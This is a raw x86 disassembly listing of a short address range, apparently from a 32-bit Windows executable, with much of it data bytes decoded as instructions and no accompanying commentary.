  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	xor    DWORD PTR [edi-0x7afac69a],esi
  43395e:	test   DWORD PTR [ecx-0x6f],ecx
  433961:	xchg   ecx,eax
  433962:	pusha  
  433963:	sbb    eax,0x411dd8ea
  433968:	sbb    eax,DWORD PTR [eax]
  43396a:	add    BYTE PTR [eax],al
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
